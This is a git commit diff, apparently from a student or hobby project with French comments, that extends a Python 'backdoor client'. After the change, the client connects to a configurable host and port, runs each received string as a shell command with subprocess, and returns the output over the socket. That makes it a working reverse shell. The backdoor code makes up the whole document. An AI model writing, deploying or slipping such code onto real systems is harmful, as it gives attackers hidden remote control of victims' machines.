dfed83bf1192d3c6d94225bc7a5c53f1c2a3cf59
Rahim10020 <rahialighi@gmail.com>
2025-03-18 19:22:43 +0000

    execution de la commande et renvoie de la reponse

--- backdoor/backdoor_client.py
+++ backdoor/backdoor_client.py
@@ -1,5 +1,7 @@
 import socket
 import time
+import subprocess
+
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -19,12 +21,17 @@ while True:
         break
 
 while True:   
-    commande_data = s.recv(MAX_DATA_SIZE)
+    commande_data = s.recv(MAX_DATA_SIZE) # binaire
     if not commande_data:
         break
-    commande = commande_data.decode()
-    print(f"Commande: {commande}")
-    reponse = commande.encode()
-    s.sendall(reponse)
+    commande = commande_data.decode()   # String
+    print(f"Commande: {commande}") # affichage de la commande qu'on a tape
+    resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True) # execution de la commande
+    
+    reponse = resultat.stdout + resultat.stderr
+    
+    if not reponse or len(reponse) == 0:    # pour gerer cd qui ne renvoie aucune reponse
+        reponse = " "
+    s.sendall(reponse.encode()) # envoie sous forme binaire
     
 s.close()
